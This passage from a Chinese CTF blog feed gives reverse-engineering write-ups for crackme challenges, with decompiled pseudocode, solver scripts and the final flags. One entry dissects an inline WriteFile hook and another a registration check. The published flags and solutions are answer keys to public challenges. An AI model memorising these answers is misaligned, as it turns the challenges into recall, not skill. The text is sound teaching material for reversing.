(int)GetProcAddress(v0, unk_40A05C);// 找到writefile的地址  lpAddress = (LPVOID)dword_40C9C4;  if ( !dword_40C9C4 )    return puts((int)&amp;dword_40A044);  unk_40C9B4 = *(_DWORD *)lpAddress;  *((_BYTE *)&amp;unk_40C9B4 + 4) = *((_BYTE *)lpAddress + 4);  byte_40C9BC = 0xE9u;  dword_40C9BD = (char *)sub_401080 - (char *)lpAddress - 5;  return sub_4010D0();&#125;</code></pre><p>在这里发现了问题，这里找到了储存<code>writefile()</code>地址的位置，然后保存前五个字节的内容，后面进行了一些赋值，看到<code>0xE9</code>就发现这里想要修改<code>writefile()</code>函数地址，跳转到另一个函数<code>sub_401080()</code>，然后函数进入<code>sub_4010D0()</code></p><pre><code class="c++">BOOL sub_4010D0()&#123;  DWORD v1; // [esp+4h] [ebp-8h]  DWORD flOldProtect; // [esp+8h] [ebp-4h]  v1 = 0;  VirtualProtectEx(hProcess, lpAddress, 5u, 4u, &amp;flOldProtect);  WriteProcessMemory(hProcess, lpAddress, &amp;byte_40C9BC, 5u, 0);  return VirtualProtectEx(hProcess, lpAddress, 5u, flOldProtect, &amp;v1);&#125;</code></pre><p>这个函数把刚刚的修改写进了相应的地址，此时程序一旦调用<code>writefile()</code>，就会跳转到<code>sub_401080()</code>，所以转到这个函数</p><pre><code class="c++">int __stdcall sub_401080(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped)&#123;  signed int v5; // ebx  v5 = sub_401000((int)lpBuffer, nNumberOfBytesToWrite);  sub_401140();  WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);  if ( v5 )    *lpNumberOfBytesWritten = 1;  return 0;&#125;</code></pre><p>如果<code>sub_401000()</code>返回值是1，就会输出我们的输入是正确的，<code>sub_401140()</code>是用来恢复<code>writefile()</code>函数的地址，就不再赘述，所以重点就是<code>sub_401000()</code></p><pre><code class="c++">signed int __cdecl sub_401000(int a1, signed int a2)&#123;  char v2; // al  char v3; // bl  char v4; // cl  int v5; // eax  v2 = 0;  if ( a2 &gt; 0 )  &#123;    do    &#123;      if ( v2 == 18 )      &#123;        *(_BYTE *)(a1 + 18) ^= 0x13u;      &#125;      else      &#123;        if ( v2 % 2 )          v3 = *(_BYTE *)(v2 + a1) - v2;        else          v3 = *(_BYTE *)(v2 + a1 + 2);        *(_BYTE *)(v2 + a1) = v2 ^ v3;      &#125;      ++v2;    &#125;    while ( v2 &lt; a2 );  &#125;  v4 = 0;  if ( a2 &lt;= 0 )    return 1;  v5 = 0;  while ( aAjygkfmSv8mln[v5] == *(_BYTE *)(v5 + a1) )  &#123;    v5 = ++v4;    if ( v4 &gt;= a2 )      return 1;  &#125;  return 0;&#125;</code></pre><p>这里的操作就很简单了，也不需要再多说，我们的输入经过处理后如果和内存中的字符串相同，就对了</p><pre><code class="c++">#include &lt;iostream&gt;using namespace std;int main() &#123;    char str[20] =            &quot;ajygkFm.\x7F_~-SV&#123;8mLn&quot;;    char a1[20] = &#123;0&#125;;    for (int i = 0; i &lt; 19; i++) &#123;        if (i == 18) &#123;            a1[i] = str[18] ^ 0x13;        &#125;        if (i % 2) &#123;            a1[i] = (str[i] ^ i) + i;        &#125; else &#123;            a1[i + 2] = (str[i] ^ i);        &#125;    &#125;    a1[0]=&#39;f&#39;;    cout &lt;&lt; a1 &lt;&lt; endl;&#125;</code></pre><p>这里有一点需要注意，这个程序是没法检测第一位输入的，中间的过程也完全没有用到第一位，所以根据输出结果手动添加了’f’，输出</p><pre><code>flag&#123;Ho0k_w1th_Fun&#125;</code></pre><p>可以验证一下，第一位其实并不影响结果</p><p><img src="https://s2.ax1x.com/2020/02/14/1XU7IP.png" alt="EASYHOOK-1"></p><p>发现第一位改成其他的字符也是正确的</p><h4 id="reverse-for-the-holy-grail-350"><a href="#reverse-for-the-holy-grail-350" class="headerlink" title="reverse-for-the-holy-grail-350"></a>reverse-for-the-holy-grail-350</h4><p>这题还算是比较简单的题目，很容易就可以找到关键函数，然后发现所有的数据处理和验证全部都在这个函数里面</p><pre><code class="c++">__int64 __fastcall stringMod(__int64 *a1)&#123;  __int64 v1; // r9  __int64 v2; // r10  __int64 i; // rcx  signed int v4; // er8  int *v5; // rdi  int *v6; // rsi  signed int v7; // ecx  signed int v8; // er9  int v9; // er10  unsigned int v10; // eax  int v11; // esi  int v12; // esi  int v14[24]; // [rsp+0h] [rbp-60h]  int _48[24]; // [rsp+48h] [rbp-18h]  memset(v14, 0, 0x48uLL);  v1 = a1[1];  if ( v1 )  &#123;    v2 = *a1;    i = 0LL;    v4 = 0;    do    &#123;      v12 = *(char *)(v2 + i);      v14[i] = v12;      if ( 3 * ((unsigned int)i / 3) == (_DWORD)i &amp;&amp; v12 != firstchar[(unsigned int)i / 3] )// 3的倍数等于firstchar        v4 = -1;      ++i;    &#125;    while ( i != v1 );  &#125;  else  &#123;    v4 = 0;  &#125;  v5 = v14;  v6 = v14;  v7 = 666;  do  &#123;    *v6 = v7 ^ *(unsigned __int8 *)v6;    v7 += v7 % 5;    ++v6;  &#125;  while ( _48 != v6 );  v8 = 1;  v9 = 0;  v10 = 1;  v11 = 0;  do  &#123;    if ( v11 == 2 )    &#123;      if ( *v5 != thirdchar[v9] )        v4 = -1;      if ( v10 % *v5 != masterArray[v9] )        v4 = -1;      ++v9;      v10 = 1;      v11 = 0;    &#125;    else    &#123;      v10 *= *v5;      if ( ++v11 == 3 )        v11 = 0;    &#125;    ++v8;    ++v5;  &#125;  while ( v8 != 19 );  return (unsigned int)(v7 * v4);&#125;</code></pre><p>发现把输入分成了三个部分，处理起来也很简单，写脚本处理</p><pre><code class="c++">#include &lt;iostream&gt;using namespace std;int main() &#123;    int firstchar[8] =            &#123;65, 105, 110, 69, 111, 97&#125;;    int thirdchar[8] =            &#123;751, 708, 732, 711, 734, 764&#125;;    int masterArray[6] =            &#123;471, 12, 580, 606, 147, 108&#125;;    int xor_[24] = &#123;0&#125;;    char flag[24] = &#123;0&#125;;    xor_[0] = 666;    for (int i = 1; i &lt; 24; i++) &#123;        xor_[i] = xor_[i - 1] + xor_[i - 1] % 5;    &#125;    for (int i = 0; i &lt; 6; i++) &#123;        flag[3 * i] = firstchar[i];        flag[3 * i + 2] = thirdchar[i] ^ xor_[3 * i + 2];        for (int j = 48; j &lt; 122; j++) &#123;            if ((j &gt;= 48 &amp;&amp; j &lt;= 57) || (j &gt;= 65 &amp;&amp; j &lt;= 90) || (j &gt;= 97 &amp;&amp; j &lt;= 122)) &#123;                int tmp = j ^xor_[3 * i + 1];                if (tmp * (flag[3 * i] ^ xor_[3 * i]) % thirdchar[i] == masterArray[i]) &#123;                    flag[3 * i + 1] = j;                    break;                &#125;            &#125; else                continue;        &#125;    &#125;    cout &lt;&lt; flag &lt;&lt; endl;&#125;</code></pre><p>输出flag，再套上<code>main</code>里面提供的格式即可</p><pre><code>tuctf&#123;AfricanOrEuropean?&#125;</code></pre><h4 id="android-app-100"><a href="#android-app-100" class="headerlink" title="android-app-100"></a>android-app-100</h4><p>反编译之后发现还调用了c的库，于是IDA打开so文件，看到了混淆，但是内容比较好猜，所以直接找到字符串计算md5或者在apk里面提交就好了</p><pre><code>Sharif_CTF(833489ef285e6fa80690099efc5d9c9d)</code></pre><h4 id="dmd-50"><a href="#dmd-50" class="headerlink" title="dmd-50"></a>dmd-50</h4><p>打开直接找到输入的flag的md5值，md5解密找到flag</p><pre><code>b781cbb29054db12f88f08c6e161c199</code></pre><h4 id="Windows-Reverse1"><a href="#Windows-Reverse1" class="headerlink" title="Windows_Reverse1"></a>Windows_Reverse1</h4><p>这道题很有意思，首先查壳，发现是upx，直接脱壳，IDA打开，F5查看</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp)&#123;  char v4; // [esp+4h] [ebp-804h]  char v5; // [esp+5h] [ebp-803h]  char v6; // [esp+404h] [ebp-404h]  char Dst; // [esp+405h] [ebp-403h]  v6 = 0;  memset(&amp;Dst, 0, 0x3FFu);  v4 = 0;  memset(&amp;v5, 0, 0x3FFu);  printf(&quot;please input code:&quot;);  scanf(&quot;%s&quot;, &amp;v6);  sub_401000(&amp;v6);  if ( !strcmp(&amp;v4, &quot;DDCTF&#123;reverseME&#125;&quot;) )    printf(&quot;You&#39;ve got it!!%s\n&quot;, &amp;v4);  else    printf(&quot;Try again later.\n&quot;);  return 0;&#125;</code></pre><p>表面上看我们需要输入一个字符串，然后经过<code>sub_401000</code>的变换之后变成<code>DDCTF&#123;reverseME&#125;</code>，然后查看一下加密函数</p><pre><code class="c++">unsigned int __cdecl sub_401000(const char *a1)&#123;  _BYTE *v1; // ecx  unsigned int v2; // edi  unsigned int result; // eax  int v4; // ebx  v2 = 0;  result = strlen(a1);  if ( result )  &#123;    v4 = a1 - v1;    do    &#123;      *v1 = byte_402FF8[(char)v1[v4]];      ++v2;      ++v1;      result = strlen(a1);    &#125;    while ( v2 &lt; result );  &#125;  return result;&#125;</code></pre><p>看起来是一个换表操作，但是在这里遇到了两个让人疑惑的事情，第一个，我们输入的字符串是怎么传入这个函数里面来的，第二个，在<code>0x402FF8</code>处什么都没有，这个表在哪里</p><p>所以还是需要仔细看看汇编代码</p><pre><code class="asm">.text:004010A4                   lea     edx, [esp+824h+var_404].text:004010AB                 push    edx.text:004010AC                 push    offset aS       ; &quot;%s&quot;.text:004010B1                 call    ds:scanf.text:004010B7                 lea     eax, [esp+82Ch+var_404].text:004010BE                 push    eax.text:004010BF                 lea     ecx, [esp+830h+var_804].text:004010C3                 call    sub_401000.text:00401000 sub_401000      proc near               ; CODE XREF: _main+73↓p.text:00401000.text:00401000 arg_0           = dword ptr  4.text:00401000.text:00401000                 push    ecx.text:00401001                 push    ebp.text:00401002                 mov     ebp, [esp+8+arg_0].text:00401006                 push    esi.text:00401007                 mov     eax, ebp.text:00401009                 push    edi.text:0040100A                 xor     edi, edi.text:0040100C                 lea     esi, [eax+1].text:0040100F                 nop</code></pre><p>这里应该是人为修改了代码，可以看到我们输入的字符串地址被赋给了<code>ecx</code>，然后再我们的解密函数最开始，先把<code>ecx</code>里面的值压进了栈，所以这个函数用了<code>ecx</code>寄存器来传参，而这是个32位的程序，所以IDA这里检测的时候出现了一点问题，第一个问题解决了，再看看第二个，先来研究里面的索引值</p><pre><code class="c++">if ( result )  &#123;    v4 = a1 - v1;    do    &#123;      *v1 = byte_402FF8[(char)v1[v4]];      ++v2;      ++v1;      result = strlen(a1);    &#125;    while ( v2 &lt; result );  &#125;</code></pre><p><code>v1[v4]</code>这个表达形式可以看得出来就是<code>a1</code>的首地址，而<code>a1</code>就是我们输入的字符串，都是可见字符，所以每个字符的值都要大于32，所以在<code>0x402FF8</code>这个位置向下偏移至少32的位置寻找，找到了真正的字母表</p><p>分析结束，可以直接动手逆向了，不过在导出这个字母表的时候很凑巧的发现这个字母表的值刚好是从126-32的排列，这说明我们输入的和变换出来的值相加正好为158，这就提供了一个更简单的逆向思路</p><pre><code class="c++">#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;int main() &#123;    string target = &quot;DDCTF&#123;reverseME&#125;&quot;;    string flag = &quot;&quot;;    for (int i = 0; i &lt; target.length(); i++) &#123;        flag += 158 - target[i];    &#125;    cout &lt;&lt; flag &lt;&lt; endl;&#125;</code></pre><p>输出套上flag即可</p><pre><code>ZZ[JX#,9(9,+9QY!</code></pre><h4 id="babymips"><a href="#babymips" class="headerlink" title="babymips"></a>babymips</h4><p>这个题本身没有什么，很简单的算法，也没有什么加密、加壳，主要是有些受不了IDA+Retdec反汇编出来的代码，所以试了一下Ghidra</p><pre><code class="c++">void FUN_004009a8(void)&#123;  int iVar1;  int iStack48;  byte abStack44 [36];    setbuf(stdout,(char *)0x0);  setbuf(stdin,(char *)0x0);  printf(&quot;Give me your flag:&quot;);  scanf(&quot;%32s&quot;,abStack44);  iStack48 = 0;  while (iStack48 &lt; 0x20) &#123;    abStack44[iStack48] = abStack44[iStack48] ^ 0x20U - (char)iStack48;    iStack48 = iStack48 + 1;  &#125;  iVar1 = strncmp((char *)abStack44,_fdata,5);  if (iVar1 == 0) &#123;    FUN_004007f0(abStack44);  &#125;  else &#123;    puts(&quot;Wrong&quot;);  &#125;  return;&#125;</code></pre><p>首先是输入flag，然后进行一个变换，先比较前5位，如果一致进入下一个变换</p><pre><code class="c++">void FUN_004007f0(char *param_1)&#123;  size_t sVar1;  int iVar2;  uint uStack16;    uStack16 = 5;  while (sVar1 = strlen(param_1), uStack16 &lt; sVar1) &#123;    if ((uStack16 &amp; 1) == 0) &#123;      param_1[uStack16] =           (byte)((uint)((int)param_1[uStack16] &lt;&lt; 0x1a) &gt;&gt; 0x18) | param_1[uStack16] &gt;&gt; 6;    &#125;    else &#123;      param_1[uStack16] =           param_1[uStack16] &gt;&gt; 2 | (byte)((uint)((int)param_1[uStack16] &lt;&lt; 0x1e) &gt;&gt; 0x18);    &#125;    uStack16 = uStack16 + 1;  &#125;  iVar2 = strncmp(param_1 + 5,PTR_DAT_00410d04,0x1b);  if (iVar2 == 0) &#123;    puts(&quot;Right!&quot;);  &#125;  else &#123;    puts(&quot;Wrong!&quot;);  &#125;  return;&#125;</code></pre><p>后面对奇数位和偶数位进行了两个不同的位运算，很清晰，仔细分析一下会发现实际上是前后位置的一个交换，并且奇偶运算就是互为逆运算，逆向的时候更方便处理了。最后是进行简单的字符串比较，然后程序就结束了。</p><pre><code class="c++">#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;int main() &#123;    string target = &quot;Q|j&#123;g\x52\xfd\x16\xa4\x89\xbd\x92\x80\x13\x41\x54\xa0\x8d\x45\x18\x81\xde\xfc\x95\xf0\x16\x79\x1a\x15\x5b\x75\x1f&quot;;    string flag = &quot;&quot;;    for (int i = 0; i &lt; target.length(); i++) &#123;        if(i&gt;=5)        &#123;            int32_t tmp=target[i];            if(i%2==0)            &#123;                tmp=((tmp&amp;0x3)&lt;&lt;6)|((tmp&amp;0xfc)&gt;&gt;2);            &#125;            else            &#123;                tmp=((tmp&amp;0xc0)&gt;&gt;6)|((tmp&amp;0x3f)&lt;&lt;2);            &#125;            flag+=(tmp^(0x20-i));        &#125;        else        &#123;            flag+=(target[i]^(0x20-i));        &#125;    &#125;    cout &lt;&lt; flag &lt;&lt; endl;&#125;</code></pre><p>需要注意的两点，运算符优先级的问题，加减运算要先于移位运算先于位运算，处理的时候需要注意，还有，移位的时候要注意把多余的位置清0，这里用的是与运算</p><p>输出flag</p><pre><code>qctf&#123;ReA11y_4_B@89_mlp5_4_XmAn_&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> re </tag>
            
            <tag> 攻防世界 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-re部分题解（二）</title>
      <link href="/2020/02/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2020/02/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>题目有点多，放在一篇里面太过臃肿，所以多分了几篇</p><span id="more"></span><h4 id="IgniteMe"><a href="#IgniteMe" class="headerlink" title="IgniteMe"></a>IgniteMe</h4><p>IDA打开，首先发现flag的格式，<code>EIS&#123;***&#125;</code></p><p>找到关键函数</p><pre><code class="c++">bool __cdecl sub_4011C0(char *a1)&#123;  size_t v2; // eax  signed int v3; // [esp+50h] [ebp-B0h]  char v4[32]; // [esp+54h] [ebp-ACh]  int v5; // [esp+74h] [ebp-8Ch]  int v6; // [esp+78h] [ebp-88h]  size_t i; // [esp+7Ch] [ebp-84h]  char v8[128]; // [esp+80h] [ebp-80h]  if ( strlen(a1) &lt;= 4 )    return 0;  i = 4;  v6 = 0;  while ( i &lt; strlen(a1) - 1 )    v8[v6++] = a1[i++];  v8[v6] = 0;  v5 = 0;  v3 = 0;                                       // v8=a1  memset(v4, 0, 0x20u);  for ( i = 0; ; ++i )  &#123;    v2 = strlen(v8);    if ( i &gt;= v2 )      break;    if ( v8[i] &gt;= &#39;a&#39; &amp;&amp; v8[i] &lt;= &#39;z&#39; )    &#123;      v8[i] -= 32;      v3 = 1;    &#125;    if ( !v3 &amp;&amp; v8[i] &gt;= &#39;A&#39; &amp;&amp; v8[i] &lt;= &#39;Z&#39; )      v8[i] += 32;                                //大小写互换    v4[i] = byte_4420B0[i] ^ sub_4013C0(v8[i]);    //唯一一步有用的计算    v3 = 0;  &#125;  return strcmp(&quot;GONDPHyGjPEKruv&#123;&#123;pj]X@rF&quot;, v4) == 0;</code></pre><p>据此写脚本逆向</p><pre><code class="c++">#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;string&gt;using namespace std;int main() &#123;    string v4=&quot;GONDPHyGjPEKruv&#123;&#123;pj]X@rF&quot;;    unsigned char byte_4420B0[] =            &#123;                    13,  19,  23,  17,   2,   1,  32,  29,  12,   2,                    25,  47,  23,  43,  36,  31,  30,  22,   9,  15,                    21,  39,  19,  38,  10,  47,  30,  26,  45,  12,                    34,   4            &#125;;    char v8[v4.length()];    for (int i = 0;i&lt;v4.length() ; ++i )    &#123;        v8[i]=((v4[i]^byte_4420B0[i])-72)^0x55;        if ( v8[i] &gt;= &#39;a&#39; &amp;&amp; v8[i] &lt;= &#39;z&#39; )        &#123;            v8[i] -= 32;        &#125; else if(v8[i] &gt;= &#39;A&#39; &amp;&amp; v8[i] &lt;= &#39;Z&#39;)&#123;            v8[i] += 32;        &#125;        else&#123;            continue;        &#125;    &#125;    cout&lt;&lt;v8&lt;&lt;endl;    return 0;&#125;</code></pre><p>把输出和我们已知的部分结合起来得到flag</p><pre><code>EIS&#123;wadx_tdgk_aihc_ihkn_pjlm&#125;</code></pre><h4 id="hackme"><a href="#hackme" class="headerlink" title="hackme"></a>hackme</h4><p>通过字符串找到关键部分</p><pre><code class="c++">__int64 __fastcall sub_400F8E(__int64 a1, __int64 a2)&#123;  __int64 v2; // rdx  __int64 v3; // rcx  __int64 v4; // r8  __int64 v5; // r9  int index; // eax  char v8[136]; // [rsp+10h] [rbp-B0h]  int v9; // [rsp+98h] [rbp-28h]  char v10; // [rsp+9Fh] [rbp-21h]  int v11; // [rsp+A0h] [rbp-20h]  unsigned __int8 v12; // [rsp+A6h] [rbp-1Ah]  char v13; // [rsp+A7h] [rbp-19h]  int v14; // [rsp+A8h] [rbp-18h]  int v15; // [rsp+ACh] [rbp-14h]  unsigned int v16; // [rsp+B0h] [rbp-10h]  int v17; // [rsp+B4h] [rbp-Ch]  _BOOL4 v18; // [rsp+B8h] [rbp-8h]  int i; // [rsp+BCh] [rbp-4h]  printf((unsigned __int64)&quot;Give me the password: &quot;);  scanf((__int64)&quot;%s&quot;, v8, a2);  for ( i = 0; v8[i]; ++i )    ;  v18 = i == 22;  v17 = 10;  do  &#123;    index = rand((__int64)&quot;%s&quot;, (__int64)v8, v2, v3, v4, v5);    v3 = (unsigned int)(index % 22);    v14 = index % 22;    v16 = 0;    v13 = byte_6B4270[index % 22];    v12 = v8[index % 22];    v11 = index % 22 + 1;    v15 = 0;    while ( v15 &lt; v11 )    &#123;      ++v15;      v16 = 1828812941 * v16 + 12345;    &#125;    v2 = v16;    v10 = v16 ^ v12;    if ( v13 != ((unsigned __int8)v16 ^ v12) )      v18 = 0;    --v17;  &#125;  while ( v17 );  if ( v18 )    v9 = printf((unsigned __int64)&quot;Congras\n&quot;);  else    v9 = printf((unsigned __int64)&quot;Oh no!\n&quot;);  return 0LL;&#125;</code></pre><p>就是个简单的运算，写个脚本逆运算一下就出来了</p><pre><code class="c++">#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;string&gt;using namespace std;int main() &#123;    unsigned char byte_6B4270[] =            &#123;                    95, 242,  94, 139,  78,  14, 163, 170, 199, 147,                    129,  61,  95, 116, 163,   9, 145,  43,  73,  40,                    147, 103            &#125;;    char v13;    char v12;    char v8[23];    unsigned int v16=0;    for(int i=0;i&lt;22;i++)    &#123;        v16=0;        v13=byte_6B4270[i];        int v11=i+1;        int v15=0;        while(v15&lt;v11)&#123;            ++v15;            v16=1828812941 * v16 + 12345;        &#125;        v8[i]=v13^v16;    &#125;    cout&lt;&lt;v8&lt;&lt;endl;    return 0;&#125;</code></pre><p>输出flag</p><pre><code>flag&#123;d826e6926098ef46&#125;</code></pre><h4 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h4><p>还是通过字符串找到关键函数</p><pre><code class="c++">int sub_401080()&#123;  unsigned int v0; // kr00_4  signed int v1; // edx  char *v2; // esi  char v3; // al  unsigned int v4; // edx  int v5; // eax  __int128 v7; // [esp+2h] [ebp-24h]  __int64 v8; // [esp+12h] [ebp-14h]  int v9; // [esp+1Ah] [ebp-Ch]  __int16 v10; // [esp+1Eh] [ebp-8h]  printf(&quot;input：&quot;, v7);  v9 = 0;  v10 = 0;  v7 = 0i64;  v8 = 0i64;  scanf((const char *)&amp;dword_402158, (unsigned int)&amp;v7);  v0 = strlen((const char *)&amp;v7);  if ( v0 &gt;= 16 &amp;&amp; v0 == 24 )                   // flag共24位  &#123;    v1 = 0;    v2 = (char *)&amp;v8 + 7;    do    &#123;      v3 = *v2--;      byte_40336C[v1++] = v3;                   // 输入的flag倒序    &#125;    while ( v1 &lt; 24 );    v4 = 0;    do    &#123;      byte_40336C[v4] = (byte_40336C[v4] + 1) ^ 6;      ++v4;    &#125;    while ( v4 &lt; 24 );    v5 = strcmp(byte_40336C, &quot;xIrCj~&lt;r|2tWsv3PtI\x7Fzndka&quot;);    if ( v5 )      v5 = -(v5 &lt; 0) | 1;    if ( !v5 )    &#123;      printf(&quot;right\n&quot;, v7);      system(&quot;pause&quot;);    &#125;  &#125;  return 0;&#125;</code></pre><p>里面的算法变得复杂而毫无意义，真正实现的功能就两个，首先将输入的字符串逆序，然后进行一个变换，最后得到已知的字符串</p><pre><code class="python">target=&#39;xIrCj~&lt;r|2tWsv3PtI\x7Fzndka&#39;flag=&#39;&#39;for i in target:    flag+=chr((ord(i)^6)-1)print(flag[::-1])</code></pre><p>输出flag</p><pre><code>flag&#123;xNqU4otPq3ys9wkDsN&#125;</code></pre><h4 id="shuffle"><a href="#shuffle" class="headerlink" title="shuffle"></a>shuffle</h4><p>打开把所有的整数转换为字符就看到了flag</p><pre><code>SECCON&#123;Welcome to the SECCON 2014 CTF!&#125;</code></pre><h4 id="re-for-50-plz-50"><a href="#re-for-50-plz-50" class="headerlink" title="re-for-50-plz-50"></a>re-for-50-plz-50</h4><p>这题是MIPS，IDA直接反编译不出来，MIPS指令学的也不是很好，所以直接用retdec插件</p><p>retdec直接反编译出来</p><pre><code class="c++">int main(int argc, char ** argv) &#123;    // 0x401398    for (int32_t i = 0; i &lt; 31; i++) &#123;        char v1 = *(char *)(i + (int32_t)&quot;cbtcqLUBChERV[[Nh@_X^D]X_YPV[CJ&quot;); // 0x4013d8        char v2 = *(char *)(*(int32_t *)((int32_t)argv + 4) + i); // 0x4013f0        if ((int32_t)v1 != ((int32_t)v2 ^ 55)) &#123;            // 0x401408            print();            exit_funct();        &#125;    &#125;    // 0x401444    exit_funct();    return 1;&#125;</code></pre><p>可以发现只有一个异或操作</p><pre><code class="python">target=&quot;cbtcqLUBChERV[[Nh@_X^D]X_YPV[CJ&quot;flag=&#39;&#39;for i in target:    flag+=chr((ord(i)^55))print(flag)</code></pre><p>输出flag</p><pre><code>TUCTF&#123;but_really_whoisjohngalt&#125;</code></pre><h4 id="parallel-comparator-200"><a href="#parallel-comparator-200" class="headerlink" title="parallel-comparator-200"></a>parallel-comparator-200</h4><p>代码审计，直接给出了源码</p><pre><code class="c++">#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;pthread.h&gt;#define FLAG_LEN 20void * checking(void *arg) &#123;    char *result = malloc(sizeof(char));    char *argument = (char *)arg;    *result = (argument[0]+argument[1]) ^ argument[2];    return result;&#125;int highly_optimized_parallel_comparsion(char *user_string)&#123;    int initialization_number;    int i;    char generated_string[FLAG_LEN + 1];    generated_string[FLAG_LEN] = &#39;\0&#39;;    while ((initialization_number = random()) &gt;= 64);        int first_letter;    first_letter = (initialization_number % 26) + 97;    pthread_t thread[FLAG_LEN];    char differences[FLAG_LEN] = &#123;0, 9, -9, -1, 13, -13, -4, -11, -9, -1, -7, 6, -13, 13, 3, 9, -13, -11, 6, -7&#125;;    char *arguments[20];    for (i = 0; i &lt; FLAG_LEN; i++) &#123;        arguments[i] = (char *)malloc(3*sizeof(char));        arguments[i][0] = first_letter;        arguments[i][1] = differences[i];        arguments[i][2] = user_string[i];        pthread_create((pthread_t*)(thread+i), NULL, checking, arguments[i]);    &#125;    void *result;    int just_a_string[FLAG_LEN] = &#123;115, 116, 114, 97, 110, 103, 101, 95, 115, 116, 114, 105, 110, 103, 95, 105, 116, 95, 105, 115&#125;;    for (i = 0; i &lt; FLAG_LEN; i++) &#123;        pthread_join(*(thread+i), &amp;result);        generated_string[i] = *(char *)result + just_a_string[i];        free(result);        free(arguments[i]);    &#125;    int is_ok = 1;    for (i = 0; i &lt; FLAG_LEN; i++) &#123;        if (generated_string[i] != just_a_string[i])            return 0;    &#125;    return 1;&#125;int main()&#123;    char *user_string = (char *)calloc(FLAG_LEN+1, sizeof(char));    fgets(user_string, FLAG_LEN+1, stdin);    int is_ok = highly_optimized_parallel_comparsion(user_string);    if (is_ok)        printf(&quot;You win!\n&quot;);    else        printf(&quot;Wrong!\n&quot;);    return 0;&#125;</code></pre><p>源码比较长，但是做的事情不多，需要注意三个函数的用法</p><p>第一个是<code>pthread_create()</code>用来创建一个新的线程</p><pre><code class="c++">int pthread_create(pthread_t *tidp,const pthread_attr_t *attr,(void*)(*start_rtn)(void*),void *arg);</code></pre><p>几个参数分别是，指向线程的指针，线程的属性，调用的函数和参数，在这段代码里实际上就是调用<code>checking()</code>函数，并把之前设定好的参数传给函数</p><p>第二个是<code>pthread_join()</code>用来传递返回结果</p><pre><code class="c++">int pthread_join(pthread_t thread, void **retval);</code></pre><p>所以result就是指向返回结果的指针，所以最终的目的就是让<code>checking()</code>函数返回的值为0</p><p>第三个是<code>random()</code>函数，在这之前没有用随机种子初始化生成器，所以随机数生成的结果不管怎么运行都是一样的，但是需要注意linux下<code>random()</code>和windows下<code>rand()</code>生成的数据并不一样</p><p>此外还需要注意一点，在c++里面，赋值语句的返回值是赋的值而不是布尔值</p><p>所以只需要根据<code>checking()</code>函数来逆向运算一下就可以得到结果了</p><pre><code class="c++">#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;string&gt;#define FLAG_LEN 20using namespace std;int main() &#123;    char differences[FLAG_LEN] = &#123;0, 9, -9, -1, 13, -13, -4, -11, -9, -1, -7, 6, -13, 13, 3, 9, -13, -11, 6, -7&#125;;    int first_letter;    first_letter = 108;    char flag[FLAG_LEN];    for (int i = 0; i &lt; FLAG_LEN; i++) &#123;        flag[i] = first_letter + differences[i];    &#125;    cout &lt;&lt; flag &lt;&lt; endl;    return 0;&#125;</code></pre><p>输出flag</p><pre><code>lucky_hacker_you_are</code></pre><h4 id="secret-galaxy-300"><a href="#secret-galaxy-300" class="headerlink" title="secret-galaxy-300"></a>secret-galaxy-300</h4><p>题目里面只有一个结构体，运行了一遍什么都没发现，OD调试的时候查找字符串找到flag</p><pre><code>aliens_are_around_us</code></pre><h4 id="srm-50"><a href="#srm-50" class="headerlink" title="srm-50"></a>srm-50</h4><p>这题是个简单的注册机，找到关键函数</p><pre><code class="c++">BOOL __stdcall DialogFunc(HWND hDlg, UINT a2, WPARAM a3, LPARAM a4)&#123;  HMODULE v5; // eax  HICON v6; // eax  HMODULE v7; // eax  HCURSOR v8; // ST20_4  HWND v9; // eax  CHAR String; // [esp+8h] [ebp-340h]  CHAR v11[4]; // [esp+108h] [ebp-240h]  char v12; // [esp+10Ch] [ebp-23Ch]  char v13; // [esp+10Dh] [ebp-23Bh]  char v14; // [esp+10Eh] [ebp-23Ah]  char v15; // [esp+10Fh] [ebp-239h]  char v16; // [esp+110h] [ebp-238h]  char v17; // [esp+111h] [ebp-237h]  char v18; // [esp+112h] [ebp-236h]  char v19; // [esp+113h] [ebp-235h]  char v20; // [esp+114h] [ebp-234h]  char v21; // [esp+115h] [ebp-233h]  char v22; // [esp+116h] [ebp-232h]  char v23; // [esp+117h] [ebp-231h]  CHAR Text; // [esp+208h] [ebp-140h]  char Src[16]; // [esp+308h] [ebp-40h]  __int128 v26; // [esp+318h] [ebp-30h]  int v27; // [esp+328h] [ebp-20h]  __int128 v28; // [esp+32Ch] [ebp-1Ch]  int v29; // [esp+33Ch] [ebp-Ch]  __int16 v30; // [esp+340h] [ebp-8h]  if ( a2 == 16 )  &#123;    EndDialog(hDlg, 0);    return 0;  &#125;  if ( a2 == 272 )  &#123;    v5 = GetModuleHandleW(0);    v6 = LoadIconW(v5, (LPCWSTR)0x67);    SetClassLongA(hDlg, -14, (LONG)v6);    v7 = GetModuleHandleW(0);    v8 = LoadCursorW(v7, (LPCWSTR)0x66);    v9 = GetDlgItem(hDlg, 1);    SetClassLongA(v9, -12, (LONG)v8);    return 1;  &#125;  if ( a2 != 273 || (unsigned __int16)a3 != 1 )    return 0;  memset(&amp;String, (unsigned __int16)a3 - 1, 0x100u);  memset(v11, 0, 0x100u);  memset(&amp;Text, 0, 0x100u);  GetDlgItemTextA(hDlg, 1001, 